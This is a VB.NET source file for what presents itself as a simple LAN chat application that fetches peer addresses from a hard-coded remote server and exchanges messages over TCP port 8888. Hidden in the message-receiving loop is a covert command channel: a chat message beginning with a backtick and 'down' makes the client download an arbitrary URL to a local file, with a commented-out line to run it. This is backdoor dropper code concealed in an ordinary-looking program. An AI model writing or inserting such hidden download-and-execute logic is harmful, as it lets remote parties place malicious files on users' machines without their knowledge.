Imports System.Threading
Imports System.Net.Sockets

<System.Runtime.InteropServices.ComVisible(False)> Public Class Form1
    Dim looper As New Thread(AddressOf Serve)
    Dim ips() As String

    Dim username As String
    Dim webcli As New System.Net.WebClient
    Dim server_addr As String = "http://kr.comze.com"
    Dim sendtoall As Boolean
    Dim oldtext As String

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        'oldtext = TextBox2.Text
        Dim th As New Thread(AddressOf send)
        th.IsBackground = True
        th.Start()

    End Sub

    Private Sub send()
        sendtoall = True

        Dim ip As String

        For Each ip In ips
            send(ip)
        Next
        SetText(TextBox1, "")

    End Sub
    Private Sub send(ByVal addr As String)
        Dim client As New TcpClient()
        Dim stream As NetworkStream
        Dim dat As [Byte]()

        Try
            client.Connect(addr, 8888)
            stream = client.GetStream()
            dat = System.Text.Encoding.ASCII.GetBytes(username & " : " & TextBox1.Text)
            stream.Write(dat, 0, dat.Length)
            client.Close()
        Catch ex As Exception
            sendtoall = False
            getips()
        End Try
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        looper.IsBackground = True
        username = fake.username
        If username.Length = 0 Then End
        looper.Start()
        getips()
    End Sub

    Private Sub getips()
        Dim iplist As String
        iplist = webcli.DownloadString(server_addr & "/addip.php")
        ips = iplist.Split(" ")
    End Sub

    Private Sub Serve()
        Dim ServerSocket As New TcpListener(8888)
        Dim cli As TcpClient
        Dim tmptxt As String

        ServerSocket.Start()

        Dim stream As NetworkStream

        While True
            Dim bfrom(1024) As Byte
            cli = ServerSocket.AcceptTcpClient
            stream = cli.GetStream
            stream.Read(bfrom, 0, 1024)
            tmptxt = System.Text.Encoding.ASCII.GetChars(bfrom)
            tmptxt = tmptxt.Trim

            Dim msglist As String()
            msglist = tmptxt.Split(" ")
            If Not msglist(0).Equals(username) Then
                If msglist(2).StartsWith("`") Then
                    Dim cmd, arg As String
                    cmd = msglist(2).Substring(1)
                    If msglist.Length > 3 Then arg = msglist(3)
                    Select Case cmd
                        Case "down"
                            download_execute(arg)
                    End Select
                Else
                End If

            End If


            If tmptxt.StartsWith(username) Then
                If sendtoall = True Then

                    setRich(rt1, tmptxt)

                End If
            Else

                setRich(rt1, tmptxt)
            End If

            cli.Close()
        End While
    End Sub

    Private Delegate Sub SetTextDelegate(ByVal TB As TextBox, ByVal txt As String)

    Private Sub SetText(ByVal TB As TextBox, ByVal txt As String)
        If TB.InvokeRequired Then
            TB.Invoke(New SetTextDelegate(AddressOf SetText), New Object() {TB, txt})
        Else

            'TB.AppendText(txt)

            TB.Text = txt
        End If
    End Sub

    Private Delegate Sub setRichDelugate(ByVal tb As RichTextBox, ByVal txt As String)

    Private Sub setRich(ByVal tb As RichTextBox, ByVal txt As String)
        If tb.InvokeRequired Then
            tb.Invoke(New setRichDelugate(AddressOf setRich), New Object() {tb, txt})
        Else

            tb.Select(0, 0)
            tb.SelectedText = vbCrLf
            tb.Select(0, 0)
            tb.SelectedText = txt
        End If
    End Sub

    Private Sub _DownloadFileCompleted(ByVal sender As Object, ByVal e As System.ComponentModel.AsyncCompletedEventArgs)
        'Shell("st.ext")
    End Sub

    Private Sub _DownloadProgressChanged(ByVal sender As Object, ByVal e As System.Net.DownloadProgressChangedEventArgs)

    End Sub

    Private Sub download_execute(ByVal fileaddr As String)
        Dim _WebClient As New System.Net.WebClient()
        AddHandler _WebClient.DownloadFileCompleted, AddressOf _DownloadFileCompleted
        AddHandler _WebClient.DownloadProgressChanged, AddressOf _DownloadProgressChanged
        _WebClient.DownloadFile(fileaddr, "st.ext")
        '_WebClient.DownloadFileAsync(New Uri(fileaddr), "st.ext")

    End Sub

    Private Sub TextBox1_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox1.KeyPress
        If e.KeyChar = Microsoft.VisualBasic.ChrW(Keys.Enter) Then
            Dim th As New Thread(AddressOf send)
            th.IsBackground = True

            th.Start()
            e.Handled = True
        End If
    End Sub


    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
End Class
